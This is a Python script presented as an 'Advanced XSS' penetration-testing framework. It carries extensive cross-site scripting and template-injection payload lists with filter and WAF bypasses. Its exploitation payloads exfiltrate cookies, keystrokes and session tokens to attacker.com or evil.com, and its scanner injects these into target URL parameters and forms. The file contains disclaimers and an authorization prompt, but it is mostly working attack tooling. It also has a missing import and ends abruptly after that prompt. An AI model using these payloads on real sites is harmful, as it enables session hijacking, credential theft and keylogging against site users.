#!/usr/bin/env python3
"""
Advanced XSS Penetration Testing Framework
===========================================
For authorized security testing only.
Supports PHP, Python, Java, Node.js, React, Angular, Vue.js
"""

import sys
import os
import re
import time
import json
import base64
import urllib.parse
import hashlib
from datetime import datetime
from colorama import init, Fore, Style
import requests
from bs4 import BeautifulSoup
import argparse

init(autoreset=True)

class Colors:
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    BLUE = Fore.BLUE
    CYAN = Fore.CYAN
    MAGENTA = Fore.MAGENTA
    WHITE = Fore.WHITE
    RESET = Style.RESET_ALL
    BRIGHT = Style.BRIGHT
    BG_RED = Back.RED
    BG_GREEN = Back.GREEN

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
{Colors.CYAN}{Colors.BRIGHT}
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║   ███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗                           ║
║   ████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝                           ║
║   ██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗                           ║
║   ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║                           ║
║   ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║                           ║
║   ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝                           ║
║                                                                           ║
║   {Colors.YELLOW} Advanced XSS Framework v3.0 {Colors.CYAN}                                    ║
║   {Colors.WHITE} Multi-Language | WAF Bypass | Context-Aware {Colors.CYAN}                      ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
{Colors.RESET}
{Colors.YELLOW}[!] WARNING: For authorized penetration testing only!
[!] Unauthorized access to computer systems is illegal.{Colors.RESET}
""")

class AdvancedXSSFramework:
    def __init__(self, attacker_url="http://attacker.com"):
        self.attacker_url = attacker_url
        self.vulnerable_params = []
        self.tested_urls = []
        self.detected_framework = None
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
        })

    # ==================== FRAMEWORK DETECTION ====================
    def detect_framework(self, url):
        """Detect the backend/frontend framework"""
        try:
            response = self.session.get(url, timeout=10)
            headers = response.headers
            content = response.text.lower()
            
            frameworks = []
            
            # Server-side detection
            if 'x-powered-by' in headers:
                powered_by = headers['x-powered-by'].lower()
                if 'php' in powered_by:
                    frameworks.append('PHP')
                elif 'express' in powered_by or 'node' in powered_by:
                    frameworks.append('Node.js')
                elif 'asp.net' in powered_by:
                    frameworks.append('ASP.NET')
                elif 'django' in powered_by:
                    frameworks.append('Django')
                elif 'flask' in powered_by:
                    frameworks.append('Flask')
            
            # Content-based detection
            if 'django' in content or '{% csrf_token %}' in content:
                frameworks.append('Django')
            if 'laravel' in content or 'csrf-token' in content:
                frameworks.append('Laravel/PHP')
            if 'react' in content or 'reactroot' in content or 'data-reactroot' in content:
                frameworks.append('React')
            if 'angular' in content or 'ng-app' in content or 'ng-controller' in content:
                frameworks.append('Angular')
            if 'vue' in content or 'v-bind' in content or 'v-model' in content:
                frameworks.append('Vue.js')
            if 'spring' in content or 'th:' in content:
                frameworks.append('Spring/Thymeleaf')
            
            # Cookie-based detection
            cookies = response.cookies
            if 'PHPSESSID' in cookies:
                frameworks.append('PHP')
            if 'JSESSIONID' in cookies:
                frameworks.append('Java')
            if 'connect.sid' in cookies:
                frameworks.append('Node.js/Express')
            if 'csrftoken' in cookies:
                frameworks.append('Django')
            
            self.detected_framework = list(set(frameworks)) if frameworks else ['Unknown']
            return self.detected_framework
            
        except Exception as e:
            print(f"{Colors.RED}[-] Framework detection failed: {e}{Colors.RESET}")
            return ['Unknown']

    # ==================== EVASION PAYLOADS ====================
    def get_case_variation_payloads(self):
        """Case variation bypass payloads"""
        return [
            '<ScRiPt>alert(1)</ScRiPt>',
            '<SCRIPT>alert(1)</SCRIPT>',
            '<sCrIpT>alert(1)</sCrIpT>',
            '<img src=x onError=alert(1)>',
            '<IMG SRC=x ONERROR=alert(1)>',
            '<svg onLoad=alert(1)>',
            '<SVG ONLOAD=alert(1)>',
        ]

    def get_html_entity_payloads(self):
        """HTML entity encoding bypass"""
        return [
            '<script>&#97;lert(1)</script>',
            '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">',
            '<script>&#x61;lert(1)</script>',
            '<img src=x onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;(1)">',
            '<<script>alert(1)//<</script>',
            '<scr<script>ipt>alert(1)</scr</script>ipt>',
        ]

    def get_double_encoding_payloads(self):
        """Double URL encoding bypass"""
        return [
            '%253Cscript%253Ealert(1)%253C%252Fscript%253E',
            '%2526lt%253Bscript%2526gt%253Balert(1)%2526lt%253B%252Fscript%2526gt%3B',
            '%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E',
        ]

    def get_protocol_handler_payloads(self):
        """Protocol handler bypass"""
        return [
            'javascript:alert(1)',
            'javascript:alert(document.cookie)',
            'data:text/html,<script>alert(1)</script>',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            'vbscript:MsgBox(1)',
            'livescript:alert(1)',
        ]

    # ==================== CONTEXT-SPECIFIC PAYLOADS ====================
    def get_html_context_payloads(self):
        """Payloads for HTML body context"""
        return [
            '<script>alert(1)</script>',
            '<script>alert(document.domain)</script>',
            '<script>alert(document.cookie)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<details open ontoggle=alert(1)>',
            '<video><source onerror=alert(1)>',
            '<audio src=x onerror=alert(1)>',
            '<object data="javascript:alert(1)">',
            '<embed src="javascript:alert(1)">',
            '<iframe src="javascript:alert(1)">',
            '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">',
        ]

    def get_attribute_context_payloads(self):
        """Payloads for attribute context (breaking out of quotes)"""
        return [
            '" onmouseover="alert(1)"',
            "' onmouseover='alert(1)'",
            '" onfocus="alert(1)" autofocus="',
            "' onfocus='alert(1)' autofocus='",
            '" onclick="alert(1)"',
            "' onclick='alert(1)'",
            '" onerror="alert(1)"',
            "' onerror='alert(1)'",
            '" onload="alert(1)"',
            "' onload='alert(1)'",
            '" oninput="alert(1)"',
            "' oninput='alert(1)'",
            '" onkeydown="alert(1)"',
            "' onkeydown='alert(1)'",
        ]

    def get_javascript_context_payloads(self):
        """Payloads for JavaScript context (breaking out of strings)"""
        return [
            "';alert(1)//",
            '";alert(1)//',
            "';alert(1);var x='",
            '";alert(1);var x="',
            "';alert(1);/*",
            '";alert(1);/*',
            "\\';alert(1)//",
            '\\";alert(1)//',
            "';alert(1)//",
            '`;alert(1)//',
            "';alert(document.cookie)//",
            "';fetch('http://evil.com/'+document.cookie)//",
        ]

    def get_url_context_payloads(self):
        """Payloads for URL/href context"""
        return [
            'javascript:alert(1)',
            'javascript:alert(document.cookie)',
            'data:text/html,<script>alert(1)</script>',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            'javascript:void(alert(1))',
            'javascript:eval(atob("YWxlcnQoMSk="))',
        ]

    def get_comment_context_payloads(self):
        """Payloads for HTML comment context"""
        return [
            '--><script>alert(1)</script><!--',
            '--><img src=x onerror=alert(1)>-->',
            '--><svg onload=alert(1)>-->',
            '--!><script>alert(1)</script>',
        ]

    # ==================== DOM-BASED XSS PAYLOADS ====================
    def get_dom_xss_payloads(self):
        """DOM-based XSS payloads"""
        return [
            '<img src=x onerror="alert(1)">',
            '<svg onload="alert(1)">',
            '<script>alert(1)</script>',
            '<body onload="alert(1)">',
            '<iframe src="javascript:alert(1)">',
            '<input onfocus="alert(1)" autofocus>',
            '<video><source onerror="alert(1)">',
            '<details open ontoggle="alert(1)">',
            '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">',
        ]

    def get_advanced_dom_payloads(self):
        """Advanced DOM XSS payloads using DOM APIs"""
        return [
            '<img src=x onerror="fetch(\'http://evil.com/?\'+document.cookie)">',
            '<script>document.location="http://evil.com/?c="+document.cookie</script>',
            '<script>navigator.sendBeacon("http://evil.com/",document.cookie)</script>',
            '<script>new Image().src="http://evil.com/?c="+document.cookie</script>',
            '<svg/onload="fetch(\'http://evil.com/?\'+document.cookie)">',
            '<img src=x onerror="this.src=\'http://evil.com/?\'+document.cookie">',
        ]

    # ==================== WAF BYPASS PAYLOADS ====================
    def get_waf_bypass_payloads(self):
        """WAF/Filter bypass payloads"""
        return [
            '<script>alert(1)</script>',
            '<scr<script>ipt>alert(1)</scr</script>ipt>',
            '<scrıpt>alert(1)</scrıpt>',
            '<script>alert`1`</script>',
            '<script/src=//evil.com/xss.js></script>',
            '<script>alert(String.fromCharCode(49))</script>',
            '<script>eval(atob("YWxlcnQoMSk="))</script>',
            '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
            '<img src="x" onerror="&#97;lert(1)">',
            '<svg/onload=alert(1)>',
            '<svg/onload=alert&#40;1&#41;>',
            '<svg><script>alert(1)</script></svg>',
            '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
            '<svg><set onbegin=alert(1) attributeName=x to=1>',
            '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">',
        ]

    def get_encoding_bypass_payloads(self):
        """Encoding-based WAF bypass"""
        return [
            '%3Cscript%3Ealert(1)%3C/script%3E',
            '%26lt%3Bscript%26gt%3Balert(1)%26lt%3B/script%26gt%3B',
            '&#60;script&#62;alert(1)&#60;/script&#62;',
            '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
            '\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E',
            '\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E',
        ]

    # ==================== FRAMEWORK-SPECIFIC PAYLOADS ====================
    def get_php_payloads(self):
        """PHP-specific XSS payloads"""
        return [
            '<?php echo "<script>alert(1)</script>"; ?>',
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            "<script>alert(1)</script>",
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            "';alert(1)//",
            '";alert(1)//',
            '<iframe src="javascript:alert(1)">',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<details open ontoggle=alert(1)>',
            '<marquee onstart=alert(1)>',
            '<video><source onerror=alert(1)>',
            '"><img src=x onerror=alert(1)>',
            "javascript:alert(1)",
            '<a href="javascript:alert(1)">click</a>',
            '<form action="javascript:alert(1)"><button>click</button></form>',
            '"><svg onload=alert(1)>',
        ]

    def get_python_payloads(self):
        """Python (Django/Flask) specific payloads"""
        return [
            '<script>alert(1)</script>',
            '{{ "".__class__.__mro__[1].__subclasses__() }}',
            '{{ "".__class__.__bases__[0].__subclasses__() }}',
            '{{ config.items() }}',
            '{{ self.__init__.__globals__ }}',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            "{{ ''.__class__.__mro__[21].__init__.__globals__['os'].popen('id').read() }}",
            '{% debug %}',
            '{{ request.application.__self__._get_data_for_json.__globals__}',
        ]

    def get_java_payloads(self):
        """Java (JSP/Spring) specific payloads"""
        return [
            '<%= Runtime.getRuntime().exec("calc") %>',
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '${7*7}',
            '#{7*7}',
            '<% out.println("test") %>',
            '<jsp:include page="test.jsp"/>',
            '${T(java.lang.Runtime).getRuntime().exec("calc")}',
            '{{7*7}}',
        ]

    def get_nodejs_payloads(self):
        """Node.js (Express/EJS/Pug) specific payloads"""
        return [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<%= alert(1) %>',
            '<%- alert(1) %>',
            '`${alert(1)}`',
            '#{alert(1)}',
            'javascript:alert(1)',
            '<iframe src="javascript:alert(1)">',
            '<body onload=alert(1)>',
        ]

    def get_react_payloads(self):
        """React-specific XSS payloads"""
        return [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onLoad=alert(1)>',
            'javascript:alert(1)',
            '"><img src=x onerror=alert(1)>',
            "'><img src=x onerror=alert(1)>",
            '{alert(1)}',
            '{alert(document.cookie)}',
            'javascript:void(alert(1))',
            'data:text/html,<script>alert(1)</script>',
            '<iframe src="javascript:alert(1)">',
            'onmouseover=alert(1)',
            'onclick=alert(1)',
            'onfocus=alert(1)',
        ]

    def get_angular_payloads(self):
        """Angular-specific XSS payloads"""
        return [
            '{{constructor.constructor("return this")().alert(1)}}',
            '{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["alert(1)"].sort(toString.constructor)}}',
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            'javascript:alert(1)',
            '{{7*7}}',
            '${7*7}',
            '<iframe src="javascript:alert(1)">',
            'onmouseover=alert(1)',
            'onclick=alert(1)',
        ]

    def get_vuejs_payloads(self):
        """Vue.js-specific XSS payloads"""
        return [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '<img src=x onerror=alert(1)>',
            '<svg @load=alert(1)>',
            'v-on:load=alert(1)',
            ':href="javascript:alert(1)"',
            'v-bind:href="javascript:alert(1)"',
            '<iframe src="javascript:alert(1)">',
            'onmouseover=alert(1)',
            'onclick=alert(1)',
            '{{constructor.constructor("return this")().alert(1)}}',
        ]

    # ==================== EXPLOITATION PAYLOADS ====================
    def get_cookie_stealing_payloads(self):
        """Cookie stealing payloads"""
        return [
            f'<script>fetch("{self.attacker_url}/steal?c="+document.cookie)</script>',
            f'<script>new Image().src="{self.attacker_url}/steal?c="+document.cookie</script>',
            f'<img src=x onerror="fetch(\'{self.attacker_url}/steal?c=\'+document.cookie)">',
            f'<script>document.location="{self.attacker_url}/steal?c="+document.cookie</script>',
            f'<script>navigator.sendBeacon("{self.attacker_url}/steal/",document.cookie)</script>',
            f'<svg onload="fetch(\'{self.attacker_url}/steal?c=\'+document.cookie)">',
        ]

    def get_keylogging_payloads(self):
        """Keylogging payloads"""
        return [
            f'<script>var k="";document.onkeypress=function(e){{k+=e.key;if(k.length>10)fetch("{self.attacker_url}/keys?k="+k)}};</script>',
            f'<script>document.addEventListener("keypress",function(e){{fetch("{self.attacker_url}/keys?k="+e.key)}});</script>',
            f'<script>onkeydown=function(e){{fetch("{self.attacker_url}/keys?k="+e.key)}}</script>',
        ]

    def get_session_hijacking_payloads(self):
        """Session hijacking payloads"""
        return [
            f'<script>fetch("{self.attacker_url}/session?sid="+document.cookie)</script>',
            f'<script>localStorage.setItem("stolen",document.cookie);fetch("{self.attacker_url}/session")</script>',
            f'<script>sessionStorage.setItem("stolen",document.cookie);fetch("{self.attacker_url}/session")</script>',
            f'<script>fetch("{self.attacker_url}/session?token="+btoa(document.cookie))</script>',
        ]

    # ==================== CORE TESTING METHODS ====================
    def extract_forms(self, url):
        """Extract forms from a URL"""
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            return forms, response.text
        except Exception as e:
            print(f"{Colors.RED}[-] Error fetching URL: {e}{Colors.RESET}")
            return [], ""

    def extract_params_from_url(self, url):
        """Extract parameters from URL"""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        return params

    def test_reflected_xss(self, url, param_name, payload):
        """Test for reflected XSS in a specific parameter"""
        try:
            test_url = url.replace(f'{param_name}=', f'{param_name}={urllib.parse.quote(payload)}')
            response = self.session.get(test_url, timeout=10)
            
            if payload in response.text:
                return True, response.text
            return False, None
        except Exception as e:
            return False, None

    def test_form_xss(self, url, form, payload):
        """Test for XSS in form submission"""
        try:
            action = form.get('action', '')
            method = form.get('method', 'post').lower()
            
            if action:
                if action.startswith('http'):
                    post_url = action
                elif action.startswith('/'):
                    parsed = urllib.parse.urlparse(url)
                    post_url = f"{parsed.scheme}://{parsed.netloc}{action}"
                else:
                    post_url = url + '/' + action
            else:
                post_url = url
            
            inputs = form.find_all(['input', 'textarea', 'select'])
            form_data = {}
            
            for inp in inputs:
                name = inp.get('name')
                if name:
                    if inp.name == 'select':
                        options = inp.find_all('option')
                        if options:
                            form_data[name] = options[0].get('value', '')
                        else:
                            form_data[name] = payload
                    else:
                        form_data[name] = payload
            
            if method == 'post':
                response = self.session.post(post_url, data=form_data, timeout=10)
            else:
                response = self.session.get(post_url, params=form_data, timeout=10)
            
            if payload in response.text:
                return True, response.text, post_url
            return False, None, post_url
        except Exception as e:
            return False, None, url

    def detect_context(self, response_text, payload):
        """Detect the context where payload is reflected"""
        contexts = []
        
        if f'>{payload}<' in response_text or f'>{payload}<' in response_text:
            contexts.append('HTML Body')
        if f'"{payload}"' in response_text or f"'{payload}'" in response_text:
            contexts.append('Attribute')
        if f'var x="{payload}"' in response_text or f"var x='{payload}'" in response_text:
            contexts.append('JavaScript')
        if f'href="{payload}"' in response_text or f"href='{payload}'" in response_text:
            contexts.append('URL/Link')
        if f'<!--{payload}-->' in response_text:
            contexts.append('HTML Comment')
        
        return contexts if contexts else ['Unknown']

    # ==================== MAIN SCANNING METHODS ====================
    def scan_url(self, url, scan_type='basic', exploitation=False):
        """Main scanning function with framework-specific testing"""
        print(f"\n{Colors.CYAN}{'='*70}")
        print(f"[*] Scanning: {url}")
        print(f"[*] Scan Type: {scan_type.upper()}")
        print(f"{'='*70}{Colors.RESET}\n")
        
        # Framework detection
        print(f"{Colors.YELLOW}[*] Detecting framework...{Colors.RESET}")
        frameworks = self.detect_framework(url)
        print(f"{Colors.GREEN}[+] Detected Frameworks: {', '.join(frameworks)}{Colors.RESET}\n")
        
        # Test URL parameters
        params = self.extract_params_from_url(url)
        if params:
            print(f"{Colors.GREEN}[+] Found {len(params)} URL parameters to test{Colors.RESET}")
            
            # Get payloads based on scan type and detected framework
            payloads = self.get_html_context_payloads()
            payloads.extend(self.get_attribute_context_payloads())
            
            if scan_type in ['advanced', 'full']:
                payloads.extend(self.get_javascript_context_payloads())
                payloads.extend(self.get_url_context_payloads())
                payloads.extend(self.get_waf_bypass_payloads())
            
            if scan_type == 'full':
                payloads.extend(self.get_case_variation_payloads())
                payloads.extend(self.get_html_entity_payloads())
                payloads.extend(self.get_double_encoding_payloads())
                payloads.extend(self.get_encoding_bypass_payloads())
                payloads.extend(self.get_comment_context_payloads())
                payloads.extend(self.get_dom_xss_payloads())
                payloads.extend(self.get_advanced_dom_payloads())
            
            # Add framework-specific payloads
            for framework in frameworks:
                if 'PHP' in framework:
                    payloads.extend(self.get_php_payloads())
                elif 'Python' in framework or 'Django' in framework or 'Flask' in framework:
                    payloads.extend(self.get_python_payloads())
                elif 'Java' in framework or 'Spring' in framework:
                    payloads.extend(self.get_java_payloads())
                elif 'Node' in framework:
                    payloads.extend(self.get_nodejs_payloads())
                elif 'React' in framework:
                    payloads.extend(self.get_react_payloads())
                elif 'Angular' in framework:
                    payloads.extend(self.get_angular_payloads())
                elif 'Vue' in framework:
                    payloads.extend(self.get_vuejs_payloads())
            
            # Add exploitation payloads if enabled
            if exploitation:
                payloads.extend(self.get_cookie_stealing_payloads())
                payloads.extend(self.get_keylogging_payloads())
                payloads.extend(self.get_session_hijacking_payloads())
            
            # Remove duplicates
            payloads = list(dict.fromkeys(payloads))
            
            for param_name in params:
                print(f"\n{Colors.YELLOW}[*] Testing parameter: {param_name}{Colors.RESET}")
                for i, payload in enumerate(payloads, 1):
                    print(f"    {Colors.WHITE}[{i}/{len(payloads)}] Testing payload...", end='\r')
                    vulnerable, response = self.test_reflected_xss(url, param_name, payload)
                    if vulnerable:
                        print(f"{Colors.GREEN}    [+] VULNERABLE! Parameter: {param_name}{Colors.RESET}")
                        print(f"{Colors.GREEN}    [+] Payload: {payload}{Colors.RESET}")
                        
                        # Detect context
                        contexts = self.detect_context(response, payload)
                        print(f"{Colors.CYAN}    [+] Context: {', '.join(contexts)}{Colors.RESET}")
                        
                        self.vulnerable_params.append({
                            'url': url,
                            'param': param_name,
                            'payload': payload,
                            'type': 'reflected',
                            'context': contexts,
                            'framework': frameworks
                        })
                        break
                else:
                    print(f"{Colors.RED}    [-] Parameter {param_name} appears secure{Colors.RESET}")
        
        # Test forms
        print(f"\n{Colors.CYAN}[*] Analyzing forms...{Colors.RESET}")
        forms, page_content = self.extract_forms(url)
        
        if forms:
            print(f"{Colors.GREEN}[+] Found {len(forms)} forms to test{Colors.RESET}")
            payloads = self.get_html_context_payloads()
            payloads.extend(self.get_attribute_context_payloads())
            
            if scan_type in ['advanced', 'full']:
                payloads.extend(self.get_javascript_context_payloads())
                payloads.extend(self.get_waf_bypass_payloads())
            
            # Add framework-specific payloads
            for framework in frameworks:
                if 'PHP' in framework:
                    payloads.extend(self.get_php_payloads())
                elif 'Python' in framework:
                    payloads.extend(self.get_python_payloads())
                elif 'Java' in framework:
                    payloads.extend(self.get_java_payloads())
                elif 'Node' in framework:
                    payloads.extend(self.get_nodejs_payloads())
                elif 'React' in framework:
                    payloads.extend(self.get_react_payloads())
                elif 'Angular' in framework:
                    payloads.extend(self.get_angular_payloads())
                elif 'Vue' in framework:
                    payloads.extend(self.get_vuejs_payloads())
            
            # Add exploitation payloads if enabled
            if exploitation:
                payloads.extend(self.get_cookie_stealing_payloads())
                payloads.extend(self.get_keylogging_payloads())
                payloads.extend(self.get_session_hijacking_payloads())
            
            payloads = list(dict.fromkeys(payloads))
            
            for i, form in enumerate(forms, 1):
                print(f"\n{Colors.YELLOW}[*] Testing form #{i}{Colors.RESET}")
                form_action = form.get('action', 'none')
                print(f"    Action: {form_action}")
                
                for j, payload in enumerate(payloads, 1):
                    print(f"    {Colors.WHITE}[{j}/{len(payloads)}] Testing payload...", end='\r')
                    vulnerable, response, post_url = self.test_form_xss(url, form, payload)
                    if vulnerable:
                        print(f"{Colors.GREEN}    [+] VULNERABLE! Form #{i}{Colors.RESET}")
                        print(f"{Colors.GREEN}    [+] Payload: {payload}{Colors.RESET}")
                        print(f"{Colors.GREEN}    [+] URL: {post_url}{Colors.RESET}")
                        
                        # Detect context
                        contexts = self.detect_context(response, payload)
                        print(f"{Colors.CYAN}    [+] Context: {', '.join(contexts)}{Colors.RESET}")
                        
                        self.vulnerable_params.append({
                            'url': post_url,
                            'form': i,
                            'payload': payload,
                            'type': 'form',
                            'context': contexts,
                            'framework': frameworks
                        })
                        break
                else:
                    print(f"{Colors.RED}    [-] Form #{i} appears secure{Colors.RESET}")
        
        self.tested_urls.append(url)

    def scan_for_dom_xss(self, url):
        """Scan for DOM-based XSS vulnerabilities"""
        print(f"\n{Colors.CYAN}{'='*70}")
        print(f"[*] Scanning for DOM-Based XSS: {url}")
        print(f"{'='*70}{Colors.RESET}\n")
        
        try:
            response = self.session.get(url, timeout=10)
            content = response.text
            
            # Check for dangerous DOM sinks
            dangerous_patterns = [
                r'document\.write\s*\(',
                r'document\.writeln\s*\(',
                r'innerHTML\s*=',
                r'outerHTML\s*=',
                r'eval\s*\(',
                r'setTimeout\s*\([^,]+\)',
                r'setInterval\s*\([^,]+\]',
                r'location\s*=',
                r'location\.href\s*=',
                r'window\.open\s*\(',
                r'document\.URL',
                r'document\.documentURI',
                r'document\.referrer',
                r'window\.location',
                r'location\.search',
                r'location\.hash',
            ]
            
            found_sinks = []
            for pattern in dangerous_patterns:
                matches = re.findall(pattern, content)
                if matches:
                    found_sinks.extend(matches)
            
            if found_sinks:
                print(f"{Colors.RED}[!] Found {len(found_sinks)} potentially dangerous DOM sinks:{Colors.RESET}")
                for sink in found_sinks[:10]:
                    print(f"    {Colors.YELLOW}• {sink}{Colors.RESET}")
                
                # Test DOM XSS payloads
                dom_payloads = self.get_dom_xss_payloads()
                dom_payloads.extend(self.get_advanced_dom_payloads())
                
                print(f"\n{Colors.YELLOW}[*] Testing {len(dom_payloads)} DOM XSS payloads...{Colors.RESET}")
                
                for i, payload in enumerate(dom_payloads, 1):
                    print(f"    {Colors.WHITE}[{i}/{len(dom_payloads)}] Testing...", end='\r')
                    vulnerable, response = self.test_reflected_xss(url, 'q', payload)
                    if vulnerable:
                        print(f"{Colors.GREEN}    [+] DOM XSS VULNERABLE!{Colors.RESET}")
                        print(f"{Colors.GREEN}    [+] Payload: {payload}{Colors.RESET}")
                        self.vulnerable_params.append({
                            'url': url,
                            'payload': payload,
                            'type': 'dom',
                            'sinks': found_sinks[:5]
                        })
                        break
                else:
                    print(f"{Colors.RED}    [-] No DOM XSS confirmed{Colors.RESET}")
            else:
                print(f"{Colors.GREEN}[+] No dangerous DOM sinks found{Colors.RESET}")
                
        except Exception as e:
            print(f"{Colors.RED}[-] Error during DOM XSS scan: {e}{Colors.RESET}")

    def generate_report(self):
        """Generate comprehensive scan report"""
        print(f"\n\n{Colors.CYAN}{Colors.BRIGHT}{'='*70}")
        print(f"                         SCAN REPORT")
        print(f"{'='*70}{Colors.RESET}\n")
        
        print(f"{Colors.WHITE}Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.RESET}")
        print(f"{Colors.WHITE}URLs Tested: {len(self.tested_urls)}{Colors.RESET}")
        print(f"{Colors.WHITE}Vulnerabilities Found: {len(self.vulnerable_params)}{Colors.RESET}")
        if self.detected_framework:
            print(f"{Colors.WHITE}Framework: {', '.join(self.detected_framework)}{Colors.RESET}")
        
        if self.vulnerable_params:
            print(f"\n{Colors.RED}{Colors.BRIGHT}[!] VULNERABILITIES FOUND:{Colors.RESET}\n")
            for i, vuln in enumerate(self.vulnerable_params, 1):
                print(f"{Colors.GREEN}{Colors.BRIGHT}{i}. {vuln['type'].upper()} XSS{Colors.RESET}")
                print(f"   URL: {vuln.get('url', 'N/A')}")
                if 'param' in vuln:
                    print(f"   Parameter: {vuln['param']}")
                if 'form' in vuln:
                    print(f"   Form: #{vuln['form']}")
                print(f"   Payload: {vuln['payload']}")
                if 'context' in vuln:
                    print(f"   Context: {', '.join(vuln['context'])}")
                if 'framework' in vuln:
                    print(f"   Framework: {', '.join(vuln['framework'])}")
                print()
        else:
            print(f"\n{Colors.GREEN}[+] No vulnerabilities found. Target appears secure.{Colors.RESET}")
        
        # Save report to file
        report_file = f"xss_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(report_file, 'w', encoding='utf-8') as f:
            f.write(f"Advanced XSS Scan Report\n")
            f.write(f"{'='*50}\n")
            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"URLs Tested: {len(self.tested_urls)}\n")
            f.write(f"Vulnerabilities Found: {len(self.vulnerable_params)}\n")
            if self.detected_framework:
                f.write(f"Framework: {', '.join(self.detected_framework)}\n")
            f.write(f"\n{'='*50}\n\n")
            
            for vuln in self.vulnerable_params:
                f.write(f"Type: {vuln['type']}\n")
                f.write(f"URL: {vuln.get('url', 'N/A')}\n")
                if 'param' in vuln:
                    f.write(f"Parameter: {vuln['param']}\n")
                if 'form' in vuln:
                    f.write(f"Form: #{vuln['form']}\n")
                f.write(f"Payload: {vuln['payload']}\n")
                if 'context' in vuln:
                    f.write(f"Context: {', '.join(vuln['context'])}\n")
                if 'framework' in vuln:
                    f.write(f"Framework: {', '.join(vuln['framework'])}\n")
                f.write(f"{'-'*50}\n")
        
        print(f"{Colors.CYAN}[+] Report saved to: {report_file}{Colors.RESET}")

def main():
    banner()
    
    parser = argparse.ArgumentParser(
        description='Advanced XSS Penetration Testing Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{Colors.YELLOW}Examples:
  python advanced_xss.py -u http://example.com/page?id=1
  python advanced_xss.py -u http://example.com -s advanced
  python advanced_xss.py -u http://example.com -s full --exploit
  python advanced_xss.py -u http://example.com --dom-xss
  python advanced_xss.py -f urls.txt -s full --attacker http://myserver.com{Colors.RESET}
        """
    )
    
    parser.add_argument('-u', '--url', help='Target URL to test')
    parser.add_argument('-f', '--file', help='File containing URLs to test')
    parser.add_argument('-s', '--scan-type', choices=['basic', 'advanced', 'full'],
                        default='basic', help='Scan type (default: basic)')
    parser.add_argument('--exploit', action='store_true',
                        help='Include exploitation payloads (cookie stealing, keylogging)')
    parser.add_argument('--dom-xss', action='store_true',
                        help='Scan for DOM-based XSS vulnerabilities')
    parser.add_argument('--attacker', default='http://attacker.com',
                        help='Attacker server URL for exploitation payloads')
    parser.add_argument('-t', '--timeout', type=int, default=10,
                        help='Request timeout in seconds (default: 10)')
    
    args = parser.parse_args()
    
    if not args.url and not args.file:
        parser.print_help()
        print(f"\n{Colors.RED}[-] Please provide a target URL or file!{Colors.RESET}")
        sys.exit(1)
    
    print(f"""
{Colors.YELLOW}[!] DISCLAIMER: This tool is for authorized security testing only.
[!] Ensure you have explicit permission before testing any target.
[!] Unauthorized testing is illegal and punishable by law.{Colors.RESET}
    """)
    
    confirm = input(f"{Colors.CYAN}Do you have authorization to test the target? (yes/no): {Colors.RESET}")
    if confirm.lower() not in ['yes', 'y']:
        print(f"{Colors.RED}[-] Exiting. Only use this tool on authorized targets.{Colors.RESET}")
        sys.exit(1)
    
